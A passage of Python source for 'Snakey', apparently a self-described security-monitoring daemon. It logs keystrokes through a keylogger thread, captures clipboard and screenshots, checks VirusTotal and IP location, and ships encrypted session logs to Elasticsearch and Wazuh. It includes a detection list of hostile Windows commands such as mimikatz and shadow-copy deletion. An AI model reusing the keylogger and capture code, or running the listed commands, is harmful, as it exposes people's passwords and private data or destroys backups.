loaded_config[\"elastic_user\"] = os.getenv(\"SNAKEY_ELASTIC_USER\", loaded_config[\"elastic_user\"])\r\n    loaded_config[\"elastic_password\"] = os.getenv(\"SNAKEY_ELASTIC_PASSWORD\", loaded_config[\"elastic_password\"])\r\n    loaded_config[\"log_level\"] = os.getenv(\"SNAKEY_LOG_LEVEL\", loaded_config[\"log_level\"]).upper()\r\n\r\n    return loaded_config\r\n\r\n# === Global Variables (Initialized after config loading) ===\r\nconfig_file = os.path.join(DEFAULT_CONFIG[\"base_path\"], \"snakey_config.json\")\r\nconfig = load_config(config_file)\r\n\r\n# Now define paths and settings using the loaded config\r\nbase_path = config[\"base_path\"]\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True) # Ensure directory exists\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon.log\") # Changed name to avoid conflict with existing (error) log\r\n\r\nscreenshot_information = \"screenshot.png\"  # Temporary screenshot file\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = set(config[\"known_countries\"]) # Use set for faster lookups\r\nKNOWN_VPN_IPS = set(config[\"known_vpn_ips\"]) # Use set for faster lookups\r\nMIN_FREE_DISK_MB = config[\"min_free_disk_mb\"]\r\n\r\n# --- VirusTotal API Endpoints (Global Constants) ---\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\n\r\n\r\n# Sensitive Command Detection Configuration\r\nSENSITIVE_CMD_COMMANDS = [\r\n    \"format c:\", \"del /s /q\", \"rmdir /s /q\", \"net user\", \"net localgroup administrators\",\r\n    \"taskkill /f /im\", \"schtasks /create\", \"reg delete\", \"mimikatz\",\r\n    \"certutil -urlcache -f -split\", \"wmic shadowcopy delete\", \"vssadmin delete shadows\",\r\n    \"powershell -nop -w hidden -c\", \"invoke-expression\", \"set-mppreference -disablerealtimemonitoring $true\",\r\n    \"bcdedit /set {current} safeboot network\", \"mshta.exe http\", \"bitsadmin /transfer\",\r\n    \"wevtutil cl system\", \"cipher /w\", \"sdelete -z\",\r\n]\r\n\r\n# === Setup Logging (now that config is loaded) ===\r\nsetup_logging(config[\"log_level\"], daemon_log_file)\r\n\r\n\r\n# === Encryption Key Loading ===\r\nfernet: Fernet = None # Type hint\r\nif not os.path.exists(key_path):\r\n    logger.critical(\"Encryption key not found! Run GenerateKey.py first. Exiting.\")\r\n    sys.exit(1)\r\n\r\ntry:\r\n    with open(key_path, \"rb\") as key_file:\r\n        key = key_file.read()\r\n    fernet = Fernet(key)\r\n    logger.info(\"Encryption key loaded successfully.\")\r\nexcept Exception as e:\r\n    logger.critical(f\"Failed to load encryption key: {e}. Exiting.\", exc_info=True)\r\n    sys.exit(1)\r\n\r\n# === Elasticsearch Configuration ===\r\nELASTIC_HOST = config[\"elastic_host\"]\r\nELASTIC_PORT = config[\"elastic_port\"]\r\nELASTIC_USER = config[\"elastic_user\"]\r\nELASTIC_PASSWORD = config[\"elastic_password\"]\r\n\r\nes_client: Elasticsearch = None # Type hint\r\n\r\n# Basic pre-check before initializing the full ES client\r\nes_precheck_successful = False\r\nlogger.info(\"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\r\nif not ELASTIC_USER or not ELASTIC_PASSWORD:\r\n    logger.critical(\"Elasticsearch username or password not set (check SNAKEY_ELASTIC_USER/SNAKEY_ELASTIC_PASSWORD environment variables or config file). Elasticsearch client will not be initialized.\")\r\nelse:\r\n    try:\r\n        response = requests_get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n                                verify=False, timeout=10, stream=True)\r\n        logger.debug(f\"Basic requests.get status: {response.status_code}\")\r\n        # Read a byte to force connection establishment, then close to prevent hanging\r\n        try:\r\n            response.raw.read(1)\r\n        except Exception as read_e:\r\n            logger.warning(f\"Error reading from raw response during pre-check (might be expected for empty response): {read_e}\", extra={\"error_type\": \"requests_raw_read_error\"})\r\n        response.close()\r\n        if response.status_code == 200:\r\n            logger.info(\"Basic requests.get pre-check successful (status 200).\")\r\n            es_precheck_successful = True\r\n        else:\r\n            logger.warning(\r\n                f\"Basic requests.get pre-check returned non-200 status: {response.status_code}. Not proceeding with ES client init.\",\r\n                extra={\"http_status\": response.status_code, \"response_text\": response.text})\r\n\r\n    except requests.exceptions.ConnectionError as e:\r\n        logger.error(f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\", exc_info=True, extra={\"error_type\": \"requests_connection_error\"})\r\n    except requests.exceptions.Timeout:\r\n        logger.error(\"requests.Timeout during pre-check: Connection timed out.\", exc_info=True, extra={\"error_type\": \"requests_timeout\"})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\", exc_info=True, extra={\"error_type\": \"requests_request_error\"})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during basic requests pre-check: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_precheck_error\"})\r\n\r\n\r\nif es_precheck_successful:\r\n    try:\r\n        es_client = Elasticsearch(\r\n            hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n            basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n            verify_certs=False,  # WARNING: Disable for testing, enable for production!\r\n            ssl_show_warn=False, # Suppress SSL warnings in logs from elasticsearch client\r\n            request_timeout=30 # Increased timeout for client initialization\r\n        )\r\n        # Attempt to ping to confirm full connection\r\n        if es_client.ping():\r\n            logger.info(\"Elasticsearch client initialized and connected successfully.\")\r\n        else:\r\n            logger.error(\"Elasticsearch client initialized but failed to ping the cluster. Check credentials.\", extra={\"error_type\": \"es_ping_failed\"})\r\n            es_client = None\r\n    except ConnectionError as e:\r\n        logger.error(f\"Elasticsearch Connection Error during client init: {e}. Check network, service status, firewall.\", exc_info=True, extra={\"error_type\": \"es_connection_error\"})\r\n        es_client = None\r\n    except AuthenticationException as e:\r\n        logger.error(f\"Elasticsearch Authentication Error during client init: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD carefully.\", exc_info=True, extra={\"error_type\": \"es_auth_error\"})\r\n        es_client = None\r\n    except TransportError as e:\r\n        logger.error(f\"Elasticsearch Transport Error during client init (HTTP status {e.status_code}): {e.info}. Problem on ES server or request formatting.\", exc_info=True, extra={\"error_type\": \"es_transport_error\", \"status_code\": e.status_code})\r\n        es_client = None\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during Elasticsearch client initialization: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_es_init_error\"})\r\n        es_client = None\r\nelse:\r\n    logger.warning(\"Elasticsearch pre-check failed. Elasticsearch client will not be initialized.\")\r\n\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath: str) -> str | None:\r\n    \"\"\"Calculates the SHA256 hash of a file.\"\"\"\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except FileNotFoundError:\r\n        logger.error(f\"File not found for hashing: {filepath}\", extra={\"file_path\": filepath})\r\n        return None\r\n    except Exception as e:\r\n        logger.error(f\"Hashing failed for {filepath}: {e}\", exc_info=True, extra={\"file_path\": filepath})\r\n        return None\r\n\r\n\r\ndef hash_text(text: str) -> str:\r\n    \"\"\"Calculates the SHA256 hash of a given string.\"\"\"\r\n    return hashlib.sha256(text.encode('utf-8')).hexdigest()\r\n\r\n\r\ndef build_merkle_tree(hashes: list[str]) -> str | None:\r\n    \"\"\"Builds a Merkle tree from a list of hashes and returns the Merkle root.\"\"\"\r\n    if not hashes:\r\n        return None\r\n    hashes = list(hashes) # Make a mutable copy\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])  # Duplicate last hash if odd number\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\n\r\ndef vt_lookup_url(url: str) -> dict:\r\n    \"\"\"Performs a VirusTotal URL lookup.\"\"\"\r\n    try:\r\n        if not config.get(\"vt_api_key\"): # Use .get() for safer access\r\n            logger.warning(\"VirusTotal API key not configured. Skipping URL lookup.\", extra={\"url\": url})\r\n            return {}\r\n\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests_get(f\"{VT_URL_LOOKUP}{url_id}\", headers={\"x-apikey\": config[\"vt_api_key\"]}, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            logger.warning(f\"VirusTotal URL lookup failed (404 Not Found) for hash {url_id}. URL likely not previously analyzed by VT.\", extra={\"url_hash\": url_id})\r\n        else:\r\n            logger.warning(f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\", extra={\"url\": url, \"status_code\": response.status_code, \"response_text\": response.text})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"VT URL lookup failed: {e}\", exc_info=True, extra={\"url\": url})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during VT URL lookup: {e}\", exc_info=True, extra={\"url\": url})\r\n    return {}\r\n\r\n\r\ndef vt_lookup_file(file_path: str) -> dict:\r\n    \"\"\"Performs a VirusTotal file lookup.\"\"\"\r\n    try:\r\n        if not config.get(\"vt_api_key\"): # Use .get() for safer access\r\n            logger.warning(\"VirusTotal API key not configured. Skipping File lookup.\", extra={\"file_path\": file_path})\r\n            return {}\r\n\r\n        if not os.path.exists(file_path):\r\n            logger.error(f\"File not found for VT lookup: {file_path}\", extra={\"file_path\": file_path})\r\n            return {}\r\n\r\n        file_hash = hash_file(file_path)\r\n        if not file_hash:\r\n            return {}\r\n\r\n        response = requests_get(f\"{VT_FILE_LOOKUP}{file_hash}\", headers={\"x-apikey\": config[\"vt_api_key\"]}, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            logger.warning(f\"VirusTotal File lookup failed (404 Not Found) for hash {file_hash} from {file_path}. File likely not previously analyzed by VT.\", extra={\"file_hash\": file_hash, \"file_path\": file_path})\r\n        else:\r\n            logger.warning(f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\", extra={\"file_path\": file_path, \"status_code\": response.status_code, \"response_text\": response.text})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"VT File lookup failed: {e}\", exc_info=True, extra={\"file_path\": file_path})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during VT File lookup: {e}\", exc_info=True, extra={\"file_path\": file_path})\r\n    return {}\r\n\r\n\r\ndef check_important_directories() -> dict[str, str]:\r\n    \"\"\"Checks the status of important user directories.\"\"\"\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n                logger.warning(f\"Failed to list contents of {name} ({path}): {e}\", extra={\"dir_name\": name, \"dir_path\": path})\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\n\r\ndef check_stop_file() -> bool:\r\n    \"\"\"Checks if the 'stop_snakey.txt' file exists to terminate the daemon.\"\"\"\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef check_disk_space(path: str, min_free_mb: int) -> bool:\r\n    \"\"\"Checks if there's enough free disk space at a given path.\"\"\"\r\n    try:\r\n        total, used, free = shutil.disk_usage(path)\r\n        free_mb = free / (1024 * 1024)\r\n        if free_mb < min_free_mb:\r\n            logger.warning(f\"Low disk space detected in {path}: {free_mb:.2f} MB free. Operations might be impacted.\", extra={\"path\": path, \"free_mb\": free_mb, \"min_free_mb\": min_free_mb})\r\n            return False\r\n        logger.debug(f\"Disk space OK in {path}: {free_mb:.2f} MB free.\")\r\n        return True\r\n    except Exception as e:\r\n        logger.error(f\"Failed to check disk space for {path}: {e}\", exc_info=True, extra={\"path\": path})\r\n        return True # Assume OK if check fails, to avoid halting the daemon\r\n\r\ndef log_to_wazuh_file(data: dict):\r\n    \"\"\"Logs session data to a file in a Wazuh-compatible JSON format.\"\"\"\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in data and isinstance(data['timestamp'], datetime):\r\n            data['timestamp'] = data['timestamp'].isoformat()\r\n        with open(wazuh_log_file, \"a\", encoding='utf-8') as f:\r\n            f.write(json.dumps(data, default=str) + \"\\n\")\r\n        logger.info(\"Log written to Wazuh-compatible file.\", extra={\"log_file\": wazuh_log_file})\r\n    except Exception as e:\r\n        logger.error(f\"Wazuh log file write failed: {e}\", exc_info=True, extra={\"log_file\": wazuh_log_file})\r\n\r\ndef save_session_to_json(session_data: dict, filepath: str):\r\n    \"\"\"\r\n    Appends session data as a new JSON object to the specified file.\r\n    Each object is on a new line to make it easier to read/parse as NDJSON.\r\n    \"\"\"\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in session_data and isinstance(session_data['timestamp'], datetime):\r\n            session_data['timestamp'] = session_data['timestamp'].isoformat()\r\n        \r\n        with open(filepath, \"a\", encoding='utf-8') as f:\r\n            f.write(json.dumps(session_data, default=str) + \"\\n\")\r\n        logger.info(f\"Session log appended to JSON file: {filepath}\", extra={\"log_file\": filepath})\r\n    except Exception as e:\r\n        logger.error(f\"Failed to write session log to JSON file {filepath}: {e}\", exc_info=True, extra={\"log_file\": filepath})\r\n\r\ndef send_to_elasticsearch(data: dict):\r\n    \"\"\"Sends collected session data to Elasticsearch.\"\"\"\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            data_to_send = data.copy()\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            # Ensure lists are not empty for Kibana visualization (empty list is fine, None is bad)\r\n            if not data_to_send.get('alerts'):\r\n                data_to_send['alerts'] = []\r\n            if not data_to_send.get('virustotal'):\r\n                data_to_send['virustotal'] = {}\r\n\r\n            logger.debug(f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\", extra={\"timestamp\": data_to_send['timestamp']})\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            logger.info(f\"Log sent to Elasticsearch. ID: {response['_id']}\", extra={\"es_id\": response['_id']})\r\n        except ConnectionError as e:\r\n            logger.error(f\"Elasticsearch Connection Error during send: {e}. Check network, service status, firewall.\", exc_info=True, extra={\"error_type\": \"es_connection_error\"})\r\n        except AuthenticationException as e:\r\n            logger.error(f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\", exc_info=True, extra={\"error_type\": \"es_auth_error\"})\r\n        except TransportError as e:\r\n            logger.error(f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\", exc_info=True, extra={\"error_type\": \"es_transport_error\", \"status_code\": e.status_code, \"es_info\": e.info})\r\n        except Exception as e:\r\n            logger.error(f\"Unexpected failure sending log to Elasticsearch: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_es_send_error\"})\r\n    else:\r\n        logger.warning(\"Elasticsearch client is not configured or connected. Log will not be sent.\")\r\n\r\n\r\ndef analyze_clipboard_for_sensitive_commands(clipboard_content: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"Analyzes clipboard content for predefined sensitive command patterns.\"\"\"\r\n    if not clipboard_content or not isinstance(clipboard_content, str):\r\n        return alerts_list\r\n\r\n    normalized_clipboard = clipboard_content.lower().strip()\r\n\r\n    for sensitive_cmd in SENSITIVE_CMD_COMMANDS:\r\n        if sensitive_cmd.lower() in normalized_clipboard:\r\n            alerts_list.append(\r\n                f\"Sensitive CMD command detected in clipboard: \"\r\n                f\"'{clipboard_content[:100].replace('\\n', ' ').strip()}...' (matched: '{sensitive_cmd}')\"\r\n            )\r\n            logger.info(f\"Sensitive CMD command detected in clipboard.\", extra={\"matched_command\": sensitive_cmd, \"clipboard_snippet\": clipboard_content[:100]})\r\n\r\n    return alerts_list\r\n\r\n\r\ndef check_country_change(current_country: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"\r\n    Checks if the country has changed since the last recorded session.\r\n    Stores the current country for future comparison.\r\n    \"\"\"\r\n    last_country_path = os.path.join(base_path, \"last_country.txt\")\r\n    try:\r\n        if os.path.exists(last_country_path):\r\n            with open(last_country_path, \"r\", encoding='utf-8') as f:\r\n                last_country = f.read().strip()\r\n            if last_country and last_country != current_country:\r\n                alerts_list.append(f\"Country changed since last session: {last_country} -> {current_country}\")\r\n                logger.info(f\"Country changed: {last_country} -> {current_country}\", extra={\"old_country\": last_country, \"new_country\": current_country})\r\n        with open(last_country_path, \"w\", encoding='utf-8') as f:\r\n            f.write(current_country)\r\n    except Exception as e:\r\n        logger.error(f\"Failed to check/update last country: {e}\", exc_info=True)\r\n    return alerts_list\r\n\r\n\r\ndef check_vpn_proxy_ip(current_ip: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"Checks if the current public IP is in a list of known VPN/proxy IPs.\"\"\"\r\n    if current_ip in KNOWN_VPN_IPS:\r\n        alerts_list.append(f\"Access from known VPN/proxy IP: {current_ip}\")\r\n        logger.info(f\"Access from known VPN/proxy IP detected: {current_ip}\", extra={\"ip_address\": current_ip})\r\n    return alerts_list\r\n\r\n\r\n# === Keylogger Thread Function ===\r\ndef on_press_threaded(key):\r\n    \"\"\"Callback for pynput.keyboard.Listener on key press event.\"\"\"\r\n    global KEYLOGGER_KEYS\r\n    try:\r\n        if hasattr(key, 'char') and key.char is not None:\r\n            KEYLOGGER_KEYS.append(key.char)\r\n        elif key == Key.space:\r\n            KEYLOGGER_KEYS.append(' ')\r\n        elif key == Key.enter:\r\n            KEYLOGGER_KEYS.append('[ENTER]')\r\n        elif key == Key.backspace:\r\n            KEYLOGGER_KEYS.append('[BACKSPACE]')\r\n        elif key == Key.tab:\r\n            KEYLOGGER_KEYS.append('[TAB]')\r\n        else:\r\n            KEYLOGGER_KEYS.append(f\"[{str(key).replace('Key.', '')}]\")\r\n    except Exception as e:\r\n        logger.error(f\"Error in on_press_threaded keylogger: {e}\", exc_info=True)\r\n\r\ndef keylogger_thread_func():\r\n    \"\"\"Function to be run in a separate thread for continuous keylogging.\"\"\"\r\n    global KEYLOGGER_LISTENER\r\n    logger.info(\"Keylogger thread started.\")\r\n    try:\r\n        with Listener(on_press=on_press_threaded) as KEYLOGGER_LISTENER:\r\n            KEYLOGGER_LISTENER.join() # This will block until listener.stop() is called\r\n    except Exception as e:\r\n        logger.critical(f\"Keylogger thread encountered a critical error: {e}. Keylogger will terminate.\", exc_info=True)\r\n    finally:\r\n        logger.info(\"Keylogger thread terminated.\")\r\n\r\n\r\n# === Main Log Collection Function ===\r\ndef collect_full_session() -> dict:\r\n    \"\"\"Collects a full session's worth of system data, activities, and alerts.\"\"\"\r\n    current_time = datetime.now(timezone.utc)\r\n    session_log: dict = {\r\n        \"timestamp\": current_time.isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\", # Will be populated from global KEYLOGGER_KEYS\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        # System Info Collection\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        try:\r\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n        except socket.gaierror as e:\r\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\r\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\r\n            logger.warning(f\"Could not get private IP: {e}\", extra={\"error\": str(e)})\r\n\r\n        # Public IP and ISP lookup (includes country check and new VPN/Proxy IP check)\r\n        current_public_ip: str | None = None\r\n        current_country: str | None = None\r\n        try:\r\n            ip_info_response = requests_get(\"https://ipinfo.io/json\", timeout=5)\r\n            ip_info_response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)\r\n            ip_info = ip_info_response.json()\r\n\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            current_public_ip = ip_info.get(\"ip\")\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            current_country = ip_info.get(\"country\")\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if current_country and current_country not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {current_country}\")\r\n                logger.info(f\"Access from untrusted country: {current_country}\", extra={\"country\": current_country})\r\n\r\n            if current_country:\r\n                session_log[\"alerts\"] = check_country_change(current_country, session_log[\"alerts\"])\r\n            if current_public_ip:\r\n                session_log[\"alerts\"] = check_vpn_proxy_ip(current_public_ip, session_log[\"alerts\"])\r\n\r\n        except requests.exceptions.Timeout:\r\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\r\n            logger.warning(\"IP info lookup timed out.\", extra={\"error_type\": \"ipinfo_timeout\"})\r\n        except requests.exceptions.RequestException as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n            logger.error(f\"IP info lookup failed: {e}\", exc_info=True, extra={\"error_type\": \"ipinfo_request_error\"})\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\r\n            logger.error(f\"Unexpected error during IP info lookup: {e}\", exc_info=True, extra={\"error_type\": \"ipinfo_unexpected_error\"})\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info collection error: {e}\")\r\n        logger.error(f\"System info collection error: {e}\", exc_info=True)\r\n\r\n    # Clipboard Collection and Analysis\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            win32clipboard.OpenClipboard()\r\n            try:\r\n                clipboard_content = win32clipboard.GetClipboardData()\r\n                session_log[\"clipboard\"] = clipboard_content\r\n            except TypeError:  # If clipboard is empty or non-text content\r\n                session_log[\"clipboard\"] = \"Clipboard is empty or contains non-text data.\"\r\n            win32clipboard.CloseClipboard()\r\n            session_log[\"clipboard_hash\"] = hash_text(str(session_log[\"clipboard\"])) # Ensure clipboard is string before hashing\r\n\r\n            session_log[\"alerts\"] = analyze_clipboard_for_sensitive_commands(session_log[\"clipboard\"], session_log[\"alerts\"])\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n            logger.error(f\"Clipboard error: {e}\", exc_info=True)\r\n    else:\r\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n        logger.info(\"Clipboard collection skipped (not Windows).\")\r\n\r\n\r\n    # Screenshot Collection and VT Scan\r\n    screenshot_file_path = os.path.join(base_path, screenshot_information)\r\n    if platform.system() == \"Windows\":\r\n        # Check disk space before attempting screenshot\r\n        if not check_disk_space(base_path, MIN_FREE_DISK_MB):\r\n            session_log[\"alerts\"].append(\"Screenshot skipped due to low disk space.\")\r\n            logger.warning(\"Screenshot skipped due to low disk space.\")\r\n        else:\r\n            try:\r\n                im = ImageGrab.grab()\r\n                im.save(screenshot_file_path)\r\n                session_log[\"screenshot_taken\"] = True\r\n                session_log[\"screenshot_hash\"] = hash_file(screenshot_file_path)\r\n\r\n                vt_result = vt_lookup_file(screenshot_file_path)\r\n                if vt_result:\r\n                    session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n                    if vt_result.get(\"malicious\", 0) > 0:\r\n                        session_log[\"alerts\"].append(f\"VirusTotal flagged screenshot file as malicious: {vt_result.get('malicious')} positives.\")\r\n                        logger.info(f\"VT flagged screenshot as malicious: {vt_result.get('malicious')} positives.\", extra={\"vt_result\": vt_result})\r\n                else:\r\n                    logger.info(\"No VirusTotal result for screenshot or scan failed.\")\r\n\r\n            except Exception as e:\r\n                session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n                logger.error(f\"Screenshot error: {e}\", exc_info=True)\r\n            finally:\r\n                if os.path.exists(screenshot_file_path):\r\n                    try:\r\n                        os.remove(screenshot_file_path)\r\n                        logger.debug(f\"Removed temporary screenshot file: {screenshot_file_path}\")\r\n                    except Exception as e:\r\n                        logger.error(f\"Failed to remove temporary screenshot file: {e}\", exc_info=True)\r\n    else:\r\n        session_log[\"screenshot_taken\"] = False\r\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\r\n        logger.info(\"Screenshot collection skipped (not Windows).\")\r\n\r\n\r\n    # VirusTotal Scan for Clipboard URL (if applicable)\r\n    if isinstance(session_log[\"clipboard\"], str) and session_log[\"clipboard\"].strip().lower().startswith((\"http://\", \"https://\")):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n            if vt_result.get(\"malicious\", 0) > 0:\r\n                session_log[\"alerts\"].append(f\"VirusTotal flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n                logger.info(f\"VT flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\", extra={\"vt_result\": vt_result})\r\n        else:\r\n            logger.info(\"No VirusTotal result for clipboard URL or scan failed.\")\r\n\r\n    # Keylogger: Collect accumulated keys from the dedicated keylogger thread\r\n    global KEYLOGGER_KEYS\r\n    session_log[\"keystrokes\"] = ''.join(KEYLOGGER_KEYS)\r\n    KEYLOGGER_KEYS = [] # Reset for the next collection cycle\r\n    logger.info(f\"Collected {len(session_log['keystrokes'])} keystrokes from keylogger thread.\")\r\n\r\n    # Important Directories Check\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    # --- Immutable Cold Storage (Enhanced Flat-File System) Logic ---\r\n    if not check_disk_space(encrypted_path, MIN_FREE_DISK_MB):\r\n        session_log[\"alerts\"].append(\"Encryption and ledger update skipped due to low disk space.\")\r\n        logger.error(\"Encryption and ledger update skipped due to low disk space in encrypted_path.\")\r\n        return session_log # Exit without updating ledger for this log\r\n\r\n    try:\r\n        # 1. Prepare the full log for encryption\r\n        log_string_for_internal_hash = json.dumps(session_log, sort_keys=True, default=str)\r\n        session_log[\"_raw_log_hash\"] = hash_text(log_string_for_internal_hash)\r\n\r\n        # 2. Encrypt the entire session log\r\n        encrypted_log_data = fernet.encrypt(log_string_for_internal_hash.encode('utf-8'))\r\n\r\n        # 3. Define unique filename for encrypted log file\r\n        encrypted_filename = f\"log_{current_time.strftime('%Y%m%d_%H%M%S_%f')}.enc\"\r\n        full_encrypted_filepath = os.path.join(encrypted_path, encrypted_filename)\r\n\r\n        # 4. Save the encrypted log to a file (Atomic Write)\r\n        temp_enc_file_path = os.path.join(encrypted_path, f\".{encrypted_filename}.tmp\")\r\n        try:\r\n            with tempfile.NamedTemporaryFile(mode='wb', delete=False, dir=encrypted_path) as temp_f: # mode 'wb' for binary data\r\n                temp_f.write(encrypted_log_data)\r\n            shutil.move(temp_f.name, full_encrypted_filepath)\r\n            logger.info(f\"Encrypted log saved to: {full_encrypted_filepath}\")\r\n        except Exception as e:\r\n            logger.error(f\"Failed to save encrypted log atomically: {e}\", exc_info=True, extra={\"file_path\": full_encrypted_filepath})\r\n            session_log[\"alerts\"].append(f\"Failed to save encrypted log: {e}\")\r\n            if os.path.exists(temp_enc_file_path):\r\n                os.remove(temp_enc_file_path)\r\n            return session_log # Critical failure, return\r\n\r\n\r\n        # 5. Hash the encrypted file content (for the blockchain ledger)\r\n        encrypted_file_hash = hash_file(full_encrypted_filepath)\r\n        if not encrypted_file_hash:\r\n            logger.error(\"Failed to hash encrypted log file. Ledger will not be updated with this log.\", extra={\"file_path\": full_encrypted_filepath})\r\n            session_log[\"alerts\"].append(\"Failed to hash encrypted log file. Ledger not updated.\")\r\n            return session_log\r\n\r\n        # 6. Update the blockchain-style hash ledger with the encrypted file's hash\r\n        try:\r\n            ledger: list[dict] = []\r\n            if 